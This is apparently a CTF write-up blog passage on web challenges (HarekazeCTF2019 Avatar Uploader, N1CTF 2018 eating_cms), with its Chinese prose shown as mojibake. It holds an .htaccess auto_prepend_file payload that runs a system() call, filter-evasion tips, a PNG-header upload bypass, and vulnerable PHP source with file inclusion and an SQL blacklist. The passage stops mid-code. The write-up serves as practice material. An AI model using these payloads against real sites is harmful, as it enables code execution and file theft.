<p>è·å¾—flagï¼Œè™½ç„¶å®ƒè¿‡æ»¤äº†flagï¼Œä½†æˆ‘ä»¬å¯ä»¥ç”¨fl??æ¥ä»£æ›¿flagï¼Œæˆ–è€…ç”¨å­—ç¬¦ä¸²è¿æ¥ï¼Œä¾‹å¦‚â€™cat%20&#x2F;flaâ€™.â€™gâ€™<br>cat flag</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?filename<span class="hljs-operator">=</span>.htaccess&amp;content<span class="hljs-operator">=</span>php_value<span class="hljs-variable">%20</span>auto_prepend_fil<span class="hljs-variable">%5</span>C<span class="hljs-variable">%0</span>Ae<span class="hljs-variable">%20</span>.htaccess<span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>Fphp<span class="hljs-variable">%20</span>system(&#x27;cat<span class="hljs-variable">%20</span>/fl??&#x27;)<span class="hljs-variable">%3</span>B<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%5</span>C<br></code></pre></td></tr></table></figure>
<p><img src="/images/9CDFC2FAE9134599988E2264C037C163.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="HarekazeCTF2019-Avatar-Uploader"><a href="#HarekazeCTF2019-Avatar-Uploader" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader"></a>[HarekazeCTF2019]Avatar Uploader</h2><p><img src="/images/DB5ED107BE9F499f84755042BB02A582.png" srcset="/img/loading.gif" lazyload><br>å…ˆç™»å½•ï¼Œç”¨æˆ·åå¤§äºç­‰äº4ä¸ªå­—ç¬¦å°±å¥½äº†ï¼Œéšä¾¿èµ·ä¸ªå<br><img src="/images/C1F1305830324a61B646FCAE657F2699.png" srcset="/img/loading.gif" lazyload><br>ä¸Šä¼ æ–‡ä»¶<br>å®ƒç»™äº†ä¸Šä¼ pngçš„æ¡ä»¶<br>å…ˆçœ‹GIF89aèƒ½ä¸èƒ½ç»•è¿‡<br>å¹¶ä¸èƒ½<br>hintè¦æ±‚æ˜¯pngæ ¼å¼<br>æ”¹ä¸‹16è¿›åˆ¶æ–‡ä»¶å¤´çœ‹æ˜¯å¦èƒ½ç»•è¿‡<br>åªæ”¹ç¬¬ä¸€è¡Œå°±å¥½äº†<br><img src="/images/30305154EC44adaA5597737D3476448.png" srcset="/img/loading.gif" lazyload><br>ä¸Šä¼ åç«Ÿç„¶ç›´æ¥ç»™äº†flag<br><img src="/images/F9454A351E8E4736BEE5178E7FC106F3.png" srcset="/img/loading.gif" lazyload><br>å…ˆçœ‹çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);<br><br><span class="hljs-variable">$session</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureClientSession</span>(CLIENT_SESSION_ID, SECRET_KEY);<br><br><span class="hljs-comment">// check whether file is uploaded</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file size</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file type</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-title function_ invoke__">finfo_close</span>(<span class="hljs-variable">$finfo</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file width/height</span><br><span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || <span class="hljs-variable">$size</span>[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br>  <span class="hljs-comment">// I hope this never happens...</span><br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ok</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>);<br><br><span class="hljs-variable">$session</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;avatar&#x27;</span>, <span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">flash</span>(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);<br><span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>åœ¨æ£€æŸ¥æ–‡ä»¶ç±»å‹æ—¶ï¼Œfinfo_file()å‡½æ•°æ£€æµ‹ä¸Šä¼ å›¾ç‰‡çš„ç±»å‹æ˜¯å¦æ˜¯image&#x2F;png<br>åœ¨æ£€æŸ¥æ–‡ä»¶é•¿å®½æ—¶ï¼Œgetimagesize() å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸå°†è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œä½†å…¶åé¢è¿˜æœ‰ï¼š<br>å¯¹äºgetimagesize() å‡½æ•°è¿”å›çš„æ•°ç»„ï¼š</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Array<br>(<br>    [<span class="hljs-number">0</span>] <span class="hljs-operator">=</span>&gt; <span class="hljs-number">290</span><br>    [<span class="hljs-number">1</span>] <span class="hljs-operator">=</span>&gt; <span class="hljs-number">69</span><br>    [<span class="hljs-number">2</span>] <span class="hljs-operator">=</span>&gt; <span class="hljs-number">3</span><br>    [<span class="hljs-number">3</span>] <span class="hljs-operator">=</span>&gt; width<span class="hljs-operator">=</span><span class="hljs-string">&quot;290&quot;</span> height<span class="hljs-operator">=</span><span class="hljs-string">&quot;69&quot;</span><br>    [bits] <span class="hljs-operator">=</span>&gt; <span class="hljs-number">8</span><br>    [mime] <span class="hljs-operator">=</span>&gt; image/png<br>)<br></code></pre></td></tr></table></figure>
<p>ç»“æœè§£é‡Šï¼š</p>
<ul>
<li>ç´¢å¼• 0 ç»™å‡ºçš„æ˜¯å›¾åƒå®½åº¦çš„åƒç´ å€¼</li>
<li>ç´¢å¼• 1 ç»™å‡ºçš„æ˜¯å›¾åƒé«˜åº¦çš„åƒç´ å€¼</li>
<li>ç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­1 &#x3D; GIFï¼Œ2 &#x3D; JPGï¼Œ3 &#x3D; PNGï¼Œ4 &#x3D; SWFï¼Œ5 &#x3D; PSDï¼Œ6 &#x3D; BMPï¼Œ7 &#x3D; TIFF(intel byte order)ï¼Œ8 &#x3D; TIFF(motorola byte order)ï¼Œ9 &#x3D; JPCï¼Œ10 &#x3D; JP2ï¼Œ11 &#x3D; JPXï¼Œ12 &#x3D; JB2ï¼Œ13 &#x3D; SWCï¼Œ14 &#x3D; IFFï¼Œ15 &#x3D; WBMPï¼Œ16 &#x3D; XBM</li>
<li>ç´¢å¼• 3 ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥ç”¨äº HTML çš„ <image> æ ‡ç­¾</image></li>
<li>ç´¢å¼• bits ç»™å‡ºçš„æ˜¯å›¾åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼</li>
<li>ç´¢å¼• channels ç»™å‡ºçš„æ˜¯å›¾åƒçš„é€šé“å€¼ï¼ŒRGB å›¾åƒé»˜è®¤æ˜¯ 3</li>
<li>ç´¢å¼• mime ç»™å‡ºçš„æ˜¯å›¾åƒçš„ MIME ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨ HTTP Content-type å¤´ä¿¡æ¯ä¸­å‘é€æ­£ç¡®çš„ä¿¡æ¯ï¼Œå¦‚ï¼šheader(â€œContent-type: image&#x2F;jpegâ€);</li>
</ul>
<p>å…ˆçœ‹è¿™ä¸ª</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[0] &gt; 256 || <span class="hljs-variable">$size</span>[1] &gt; 256) &#123;<br>  <span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>æˆ‘ä»¬åœ¨åˆ›å»ºæ–‡ä»¶æ—¶å¹¶æ²¡æœ‰æ„é€ åƒç´ å€¼ï¼Œæ‰€ä»¥æœªæŠ¥é”™</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">if</span> ($size[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br>  <span class="hljs-comment">// I hope this never happens...</span><br>  <span class="hljs-keyword">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-keyword">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br><br></code></pre></td></tr></table></figure>
<p>ç´¢å¼•2è¿”å›çš„æ˜¯æ•°å­—ä¸æ˜¯PNGï¼Œå°†è¾“å‡ºpart 1çš„flag<br>è¿™ä¹Ÿå°±è¯´çš„é€šäº†</p>
<p>ä¸ºäº†è·å–åˆ°flagï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡å‡½æ•°finfo_file()æˆ–å‡½æ•°getimagesize() çš„éªŒè¯<br>å‡½æ•°finfo_file()å…¶ä¸»è¦æ˜¯è¯†åˆ«PNGæ–‡ä»¶åå…­è¿›åˆ¶ä¸‹çš„ç¬¬ä¸€è¡Œä¿¡æ¯ï¼Œè‹¥ä¿ç•™æ–‡ä»¶å¤´ä¿¡æ¯ï¼Œç ´åæ‰æ–‡ä»¶é•¿å®½ç­‰å…¶ä½™ä¿¡æ¯ï¼Œä¹Ÿå°±å¯ä»¥ç»•è¿‡getimagesize() å‡½æ•°çš„æ£€éªŒ</p>
<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p><img src="/images/FC78743486744d5f8CCFD287B00DD12F.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸ªç•Œé¢å¯ä»¥å…ˆè€ƒè™‘ä¸€ä¸‹sqlæ³¨å…¥å’Œå¼±å¯†ç çˆ†ç ´<br><img src="/images/B698F236EF52407f8579416F46F79A91.png" srcset="/img/loading.gif" lazyload><br>èƒ½çœ‹åˆ°sqlæ³¨å…¥çš„è¯­å¥ï¼Œè¿™é‡Œæœ‰é˜²ç«å¢™ï¼Œä¸å¥½æ³¨<br>å‘ç°register.php<br>å…ˆæ³¨å†Œä¸€ä¸ªç™»å½•å†è¯´<br><img src="/images/9E71ACEE48494109A98B24B4E5CEEC15.png" srcset="/img/loading.gif" lazyload><br>ç–‘ä¼¼æ–‡ä»¶åŒ…å«ï¼Œä¼ªåè®®è¯»ä¸€ä¸‹æºç <br><img src="/images/E781083A39054812835970BA36905BD9.png" srcset="/img/loading.gif" lazyload><br>guest.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly &quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/guest.html&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>user.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;function.php&quot;</span>);<br><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] ))&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE_admin</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE</span>;<br>&#125;<br><span class="hljs-comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])|| <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;info&#x27;</span>)<br>        &#123;<br><span class="hljs-comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span><br>            <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: user.php?page=guest&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">filter_directory</span>();<br><span class="hljs-comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><br><span class="hljs-comment">//    $page = &#x27;info&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$page</span>.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hacker</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: hacker.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$whitelist</span>&quot;</span>, <span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Hacker</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$blacklist</span>/is&quot;</span>, <span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">Hacker</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">real_escape_string</span>(<span class="hljs-variable">$string</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span 